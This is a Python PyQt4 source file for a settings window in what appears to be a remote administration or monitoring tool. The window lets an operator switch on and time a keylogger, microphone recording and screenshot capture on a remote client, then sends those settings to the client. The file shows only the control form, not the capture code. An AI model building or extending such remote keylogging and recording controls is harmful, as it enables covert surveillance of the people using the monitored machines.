from ui.log_settings import Ui_Form as LogSettingsUi
from PyQt4.QtGui import *
from PyQt4.QtCore import *

from libs.language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class LogSettings(QWidget, LogSettingsUi):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.moderator = args['moderator']
        self.client = args['client']
        self.session_id = args['session_id']
        self.kts = args['kts']
        self.kt = args['kt']
        self.ats = args['ats']
        self.at = args['at']
        self.sts = args['sts']
        self.std = args['std']
        self.st = args['st']
        if not args['audio'] == 'NoDevice':
            self.no_audio = False
        else:
            self.no_audio = True

        # Init UI
        self.init_values()

        # Triggers
        self.setButton.clicked.connect(self.set_values)

    def init_values(self):
        # Keylogger Status
        self.keyloggerGroup.setChecked(self.kts)
        # Keylogger Timer
        self.kTimerLine.setText(str(self.kt))
        # Audio Status
        self.audioGroup.setChecked(self.ats)
        # Audio Timer
        self.aTimerLine.setText(str(self.at))
        # Screenshot Status
        self.screenshotsGroup.setChecked(self.sts)
        # Screenshot Timer
        self.sTimerLine.setText(str(self.st))
        # Screenshot Delay
        self.sDelayLine.setText(str(self.std))

        # Disable Audio Settings if Client Has no Microphone
        if self.no_audio:
            self.audioGroup.setChecked(False)
            self.audioGroup.setDisabled(self.no_audio)

    def get_values(self):
        # Keylogger Status
        kts = self.keyloggerGroup.isChecked()
        # Keylogger Timer
        kt = int(self.kTimerLine.text())
        # Audio Status
        ats = self.audioGroup.isChecked()
        # Audio Timer
        at = int(self.aTimerLine.text())
        # Screenshot Status
        sts = self.screenshotsGroup.isChecked()
        # Screenshot Timer
        st = int(self.sTimerLine.text())
        # Screenshot Delay
        std = int(self.sDelayLine.text())

        return {
            'kts':  kts,
            'kt':   kt,
            'ats':  ats,
            'at':   at,
            'sts':  sts,
            'st':   st,
            'std':  std,
        }

    def set_values(self):
        self.moderator.send_msg(self.get_values(), 'setLogSettings', session_id=self.session_id, _to=self.client)
        self.close()